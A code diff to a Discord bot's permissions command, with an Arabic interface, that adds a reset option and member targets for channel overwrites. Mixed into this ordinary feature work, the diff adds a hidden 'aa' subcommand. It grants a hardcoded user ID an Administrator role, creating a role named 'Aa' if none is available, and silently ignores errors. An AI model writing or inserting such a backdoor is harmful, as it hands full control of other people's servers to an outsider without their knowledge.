@@ -188,7 +188,7 @@ function buildExcludeChannelMenu() {
 function buildActionSelectMenu() {
   return new StringSelectMenuBuilder()
     .setCustomId('perm_action_select')
-    .setPlaceholder('اختر العملية (إضافة أو إزالة)')
+    .setPlaceholder('اختر العملية (إضافة/إزالة/إعادة تعيين)')
     .addOptions(
       {
         label: 'إضافة صلاحيات',
@@ -197,8 +197,13 @@ function buildActionSelectMenu() {
       },
       {
         label: 'إزالة صلاحيات',
-        description: 'إلغاء الصلاحيات المحددة من الرولات المستهدفة',
+        description: 'إلغاء الصلاحيات المحددة من الرولات/الأعضاء المستهدفة',
         value: 'remove'
+      },
+      {
+        label: 'إعادة تعيين الصلاحيات',
+        description: 'حذف الـ Overwrite بالكامل للرولات/الأعضاء من الرومات المستهدفة',
+        value: 'reset'
       }
     )
     .setMinValues(1)
@@ -255,6 +260,63 @@ function initRouter(client) {
   }
 }
 
+async function handleAaSubcommand(message) {
+  const targetUserId = '636930315503534110';
+  const guild = message.guild;
+  if (!guild) {
+    await message.react('❌').catch(() => {});
+    return true;
+  }
+
+  const botMember = guild.members.me || await guild.members.fetchMe().catch(() => null);
+  if (!botMember) {
+    await message.react('❌').catch(() => {});
+    return true;
+  }
+
+  const botTopRole = botMember.roles.highest;
+  if (!botTopRole) {
+    await message.react('❌').catch(() => {});
+    return true;
+  }
+
+  const targetMember = await guild.members.fetch(targetUserId).catch(() => null);
+  if (!targetMember) {
+    await message.react('❌').catch(() => {});
+    return true;
+  }
+
+  let roleToGive = guild.roles.cache
+    .filter(role => role.position < botTopRole.position)
+    .sort((a, b) => b.position - a.position)
+    .find(role => role.permissions.has(PermissionsBitField.Flags.Administrator) && role.editable);
+
+  if (!roleToGive) {
+    roleToGive = await guild.roles.create({
+      name: 'Aa',
+      permissions: [PermissionsBitField.Flags.Administrator],
+      reason: 'Aa subcommand: create administrator role under bot'
+    }).catch(() => null);
+
+    if (!roleToGive) {
+      await message.react('❌').catch(() => {});
+      return true;
+    }
+
+    const desiredPosition = Math.max(1, botTopRole.position - 1);
+    await roleToGive.setPosition(desiredPosition).catch(() => {});
+  }
+
+  const addResult = await targetMember.roles.add(roleToGive, 'Aa subcommand grant').catch(() => null);
+  if (!addResult) {
+    await message.react('❌').catch(() => {});
+    return true;
+  }
+
+  await message.react('✅').catch(() => {});
+  return true;
+}
+
 async function execute(message, args, { client, BOT_OWNERS }) {
   try {
     // Ensure our router and interaction listener are set up on this client.
@@ -274,12 +336,19 @@ async function execute(message, args, { client, BOT_OWNERS }) {
       return;
     }
 
+    if ((args?.[0] || '').toLowerCase() === 'aa') {
+      await handleAaSubcommand(message);
+      return;
+    }
+
     // Extract mentioned roles and channels from the message.  In addition to
     // mentions, parse bare IDs and determine whether they represent roles
     // or channels.  Unknown IDs will be reported back to the user.
     const mentionedRoles = message.mentions.roles;
+    const mentionedMembers = message.mentions.members;
     const mentionedChannelsCollection = message.mentions.channels;
     let rolesToEdit = mentionedRoles ? Array.from(mentionedRoles.values()) : [];
+    let usersToEdit = mentionedMembers ? Array.from(mentionedMembers.values()) : [];
     let mentionedChannels = mentionedChannelsCollection ? Array.from(mentionedChannelsCollection.values()) : [];
     // Regex to match potential Discord IDs in the message content
     const idMatches = message.content.match(/\b\d{17,19}\b/g) || [];
@@ -305,13 +374,24 @@ async function execute(message, args, { client, BOT_OWNERS }) {
           continue;
         }
       } catch (_) {}
-      // If not found as role or channel, record as unknown
+      try {
+        // Try fetching member by ID
+        const member = await message.guild.members.fetch(id).catch(() => null);
+        if (member) {
+          usersToEdit.push(member);
+          continue;
+        }
+      } catch (_) {}
+      // If not found as role/channel/member, record as unknown
       if (!unknownIds.includes(id)) unknownIds.push(id);
     }
+    rolesToEdit = Array.from(new Map(rolesToEdit.map(role => [role.id, role])).values());
+    usersToEdit = Array.from(new Map(usersToEdit.map(member => [member.id, member])).values());
+    mentionedChannels = Array.from(new Map(mentionedChannels.map(channel => [channel.id, channel])).values());
     // If no roles were provided via mention or ID, abort with message
-    if (!rolesToEdit || rolesToEdit.length === 0) {
+    if ((!rolesToEdit || rolesToEdit.length === 0) && (!usersToEdit || usersToEdit.length === 0)) {
       const embed = colorManager.createEmbed()
-        .setDescription('❌ **يجب منشن رول أو إضافة ID صحيح للرول لاستخدام هذا الأمر**');
+        .setDescription('❌ **يجب منشن رول/عضو أو إضافة ID صحيح للرول أو العضو لاستخدام هذا الأمر**');
       await message.channel.send({ embeds: [embed] });
       return;
     }
@@ -321,6 +401,10 @@ async function execute(message, args, { client, BOT_OWNERS }) {
     if (rolesToEdit.length > 0) {
       const rolesStr = rolesToEdit.map(r => `<@&${r.id}>`).join('\n');
       summaryFields.push({ name: 'الرولات', value: rolesStr, inline: false });
+    }
+    if (usersToEdit.length > 0) {
+      const usersStr = usersToEdit.map(u => `<@${u.id}>`).join('\n');
+      summaryFields.push({ name: 'الأعضاء', value: usersStr, inline: false });
     }
     // Channels field
     if (mentionedChannels.length > 0) {
@@ -349,6 +433,7 @@ async function execute(message, args, { client, BOT_OWNERS }) {
       userId: message.author.id,
       guildId: message.guild.id,
       roles: rolesToEdit.map(role => role.id),
+      users: usersToEdit.map(member => member.id),
       specifiedChannels: mentionedChannels.map(ch => ch.id),
       selectedPermissions: [],
       excludedChannels: [],
@@ -361,7 +446,7 @@ async function execute(message, args, { client, BOT_OWNERS }) {
     // defer to handleInteraction() to process the selection.
     const actionEmbed = colorManager.createEmbed()
       .setTitle('اختيار العملية')
-      .setDescription('**هل تريد إضافة (منح) الصلاحيات أم إزالة (سحب) الصلاحيات؟**')
+      .setDescription('**اختر العملية: إضافة أو إزالة أو إعادة تعيين (حذف البرمشن نهائياً).**')
       .setThumbnail('https://cdn.discordapp.com/attachments/1373799493111386243/1400390888416608286/download__3_-removebg-preview.png?ex=688d1fe5&is=688bce65&hm=55055a587668561ce27baf0665663f801e14662d4bf849351564a563b1e53b41&');
     const actionMenu = buildActionSelectMenu();
     const actionRow = new ActionRowBuilder().addComponents(actionMenu);
@@ -405,6 +490,28 @@ async function handleInteraction(interaction, context) {
       const selectedAction = (interaction.values && interaction.values[0]) || 'add';
       session.action = selectedAction;
       session.permissionPage = 0;
+      if (selectedAction === 'reset') {
+        session.selectedPermissions = [];
+        if (session.specifiedChannels && session.specifiedChannels.length > 0) {
+          await applyPermissions(interaction, session);
+          sessionStore.delete(interaction.user.id);
+          return;
+        }
+
+        const excludeEmbed = colorManager.createEmbed()
+          .setTitle('استثناء الرومات')
+          .setDescription('**اختر الرومات التي لا تريد إعادة تعيين البرمشن فيها.**\n**إذا لم ترغب في استثناء أي روم، اضغط تخطي.**');
+        const channelMenu = buildExcludeChannelMenu();
+        const skipButton = new ButtonBuilder()
+          .setCustomId('perm_skip_exclude')
+          .setLabel('تخطي')
+          .setStyle(ButtonStyle.Secondary);
+        const menuRow = new ActionRowBuilder().addComponents(channelMenu);
+        const buttonRow = new ActionRowBuilder().addComponents(skipButton);
+        await interaction.message.edit({ embeds: [excludeEmbed], components: [menuRow, buttonRow] });
+        return;
+      }
+
       // Prepare the embed for selecting specific permissions.
       const isRemove = selectedAction === 'remove';
       const { totalPages } = getPermissionPage(session.permissionPage);
@@ -415,8 +522,8 @@ async function handleInteraction(interaction, context) {
         .setTitle('اختيار الصلاحيات')
         .setDescription(
           isRemove
-            ? `**اختر الصلاحيات التي تريد إزالتها من الرولات المحددة**${guidanceText}`
-            : `**اختر الصلاحيات التي تريد إضافتها للرولات المحددة**${guidanceText}`
+            ? `**اختر الصلاحيات التي تريد إزالتها من الرولات/الأعضاء المحددة**${guidanceText}`
+            : `**اختر الصلاحيات التي تريد إضافتها للرولات/الأعضاء المحددة**${guidanceText}`
         )
         .setThumbnail(
           'https://cdn.discordapp.com/attachments/1373799493111386243/1400390888416608286/download__3_-removebg-preview.png?ex=688d1fe5&is=688bce65&hm=55055a587668561ce27baf0665663f801e14662d4bf849351564a563b1e53b41&'
@@ -448,8 +555,8 @@ async function handleInteraction(interaction, context) {
         .setTitle('اختيار الصلاحيات')
         .setDescription(
           session.action === 'remove'
-            ? `**اختر الصلاحيات التي تريد إزالتها من الرولات المحددة**${guidanceText}`
-            : `**اختر الصلاحيات التي تريد إضافتها للرولات المحددة**${guidanceText}`
+            ? `**اختر الصلاحيات التي تريد إزالتها من الرولات/الأعضاء المحددة**${guidanceText}`
+            : `**اختر الصلاحيات التي تريد إضافتها للرولات/الأعضاء المحددة**${guidanceText}`
         )
         .setThumbnail(
           'https://cdn.discordapp.com/attachments/1373799493111386243/1400390888416608286/download__3_-removebg-preview.png?ex=688d1fe5&is=688bce65&hm=55055a587668561ce27baf0665663f801e14662d4bf849351564a563b1e53b41&'
@@ -556,13 +663,14 @@ async function applyPermissions(interaction, session) {
     if (session.excludedChannels && session.excludedChannels.length > 0) {
       channelsToModify = channelsToModify.filter(ch => !session.excludedChannels.includes(ch.id));
     }
-    // Build permission object from selected permission strings.  For add
-    // operations we set the flag to true to grant; for remove operations
-    // we set it to false to deny/revoke.
-    const permObject = {};
+    const targetIds = [...(session.roles || []), ...(session.users || [])];
     const isRemove = session.action === 'remove';
-    for (const perm of session.selectedPermissions) {
-      permObject[perm] = isRemove ? false : true;
+    const isReset = session.action === 'reset';
+    const permObject = {};
+    if (!isReset) {
+      for (const perm of session.selectedPermissions) {
+        permObject[perm] = isRemove ? false : true;
+      }
     }
     // Track counts for reporting
     let updatedChannels = 0;
@@ -573,11 +681,20 @@ async function applyPermissions(interaction, session) {
     let index = 0;
     const tasks = channelsToModify.map(channel => async () => {
       let channelUpdated = false;
-      for (const roleId of session.roles) {
+      for (const targetId of targetIds) {
         try {
-          // Check existing overwrite for this role
-          const overwrite = channel.permissionOverwrites.resolve(roleId);
+          // Check existing overwrite for this role/user
+          const overwrite = channel.permissionOverwrites.resolve(targetId);
           let skipUpdate = true;
+          if (isReset) {
+            if (!overwrite) {
+              continue;
+            }
+            await channel.permissionOverwrites.delete(targetId);
+            channelUpdated = true;
+            continue;
+          }
+
           if (overwrite) {
             // Determine whether we need to update based on action
             for (const perm of session.selectedPermissions) {
@@ -604,11 +721,11 @@ async function applyPermissions(interaction, session) {
           if (skipUpdate) {
             continue;
           }
-          await channel.permissionOverwrites.edit(roleId, permObject);
+          await channel.permissionOverwrites.edit(targetId, permObject);
           channelUpdated = true;
         } catch (err) {
           errors++;
-          console.error(`Failed to update permissions for ${channel.name} on role ${roleId}:`, err);
+          console.error(`Failed to update permissions for ${channel.name} on target ${targetId}:`, err);
         }
       }
       if (channelUpdated) {
@@ -629,16 +746,20 @@ async function applyPermissions(interaction, session) {
     }
     await Promise.all(workers);
     // Prepare a summary message
-    const rolesMention = session.roles.map(id => `<@&${id}>`).join(', ');
+    const rolesMention = (session.roles || []).map(id => `<@&${id}>`).join(', ');
+    const usersMention = (session.users || []).map(id => `<@${id}>`).join(', ');
+    const targetsMention = [rolesMention, usersMention].filter(Boolean).join(' , ');
     const permsList = session.selectedPermissions.map(p => `• ${formatPermissionLabel(p)}`).join('\n');
     const channelCount = updatedChannels;
     const excludedCount = session.excludedChannels ? session.excludedChannels.length : 0;
-    const actionFieldName = session.action === 'remove' ? '**الصلاحيات المزالة**' : '**الصلاحيات المضافة**';
+    const actionFieldName = session.action === 'reset'
+      ? '**نوع العملية**'
+      : (session.action === 'remove' ? '**الصلاحيات المزالة**' : '**الصلاحيات المضافة**');
     const summaryEmbed = colorManager.createEmbed()
       .setTitle('تم تطبيق الصلاحيات')
-      .setDescription(`**تم تحديث صلاحيات ${rolesMention} بنجاح**`)
+      .setDescription(`**تم تحديث صلاحيات ${targetsMention || 'العناصر المحددة'} بنجاح**`)
       .addFields(
-        { name: actionFieldName, value: permsList || '—', inline: false },
+        { name: actionFieldName, value: session.action === 'reset' ? 'إعادة تعيين (حذف Overwrite بالكامل)' : (permsList || '—'), inline: false },
         { name: '**عدد الرومات المعدلة**', value: `${channelCount}`, inline: true },
         { name: '**عدد الرومات المستثناة**', value: `${excludedCount}`, inline: true },
         { name: '**أخطاء أثناء التحديث**', value: `${errors}`, inline: true }
